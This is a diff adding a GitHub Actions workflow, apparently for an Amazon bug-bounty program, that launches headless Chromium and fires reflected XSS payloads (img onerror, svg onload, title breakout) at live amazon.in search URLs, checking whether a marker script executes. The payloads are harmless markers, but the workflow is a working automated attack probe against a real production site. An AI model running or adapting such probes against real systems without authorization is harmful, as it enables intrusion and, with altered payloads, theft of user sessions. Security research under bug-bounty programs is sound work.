@@ -1,0 +1,88 @@
+name: Amazon VRP Reflected XSS Probe
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - ".github/workflows/amazon-vrp-xss.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  xss:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: Set up Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22
+
+      - name: Install Playwright Chromium
+        shell: bash
+        run: |
+          npm init -y >/dev/null 2>&1
+          npm install --no-fund --no-audit playwright@1.55.0 >/dev/null 2>&1
+          npx playwright install --with-deps chromium >/dev/null 2>&1
+
+      - name: Test Amazon.in reflected XSS candidates
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/xss-test.mjs <<'EOF'
+          import { chromium } from 'playwright';
+
+          const ua = 'amazonvrpresearcher_pradyuman1';
+          const payloads = [
+            '"><img src=x onerror="document.body.dataset.h1xss=\'EXECUTED\'">',
+            '"><svg/onload="document.body.dataset.h1xss=\'EXECUTED\'">',
+            '</title><svg/onload="document.body.dataset.h1xss=\'EXECUTED\'">'
+          ];
+
+          const targets = [
+            'https://www.amazon.in/s?k={P}',
+            'https://www.amazon.in/s?field-keywords={P}',
+            'https://www.amazon.in/s?rh=p_89%3A{P}&k={P}',
+            'https://www.amazon.in/s?i=aps&k={P}',
+            'https://www.amazon.in/s?ref={P}&k=notebook'
+          ];
+
+          const browser = await chromium.launch({headless:true});
+          let finding = false;
+          for (const raw of targets) {
+            for (const p of payloads) {
+              const url = raw.replace('{P}', encodeURIComponent(p));
+              const page = await browser.newPage({
+                userAgent: ua,
+                extraHTTPHeaders: { 'Accept-Language': 'en-IN,en;q=0.9' }
+              });
+              let status = null;
+              try {
+                const resp = await page.goto(url, {waitUntil:'domcontentloaded', timeout:30000});
+                status = resp?.status() ?? null;
+                await page.waitForTimeout(1200);
+                const executed = await page.evaluate(() => document.body?.dataset?.h1xss === 'EXECUTED');
+                const html = await page.content();
+                const marker = html.includes('EXECUTED');
+                console.log('TEST', url);
+                console.log('STATUS', status, 'EXECUTED', executed, 'MARKER_IN_DOM', marker, 'FINAL_URL', page.url());
+                if (executed) {
+                  finding = true;
+                  console.log('VERIFIED_FINDING reflected_xss', url);
+                  break;
+                }
+              } catch (e) {
+                console.log('ERROR', url, String(e));
+              } finally {
+                await page.close();
+              }
+              await new Promise(r=>setTimeout(r,2200));
+            }
+            if (finding) break;
+          }
+          await browser.close();
+          if (!finding) console.log('NO_VERIFIED_REFLECTED_XSS');
+          if (finding) process.exit(42);
+          EOF
+          node /tmp/xss-test.mjs
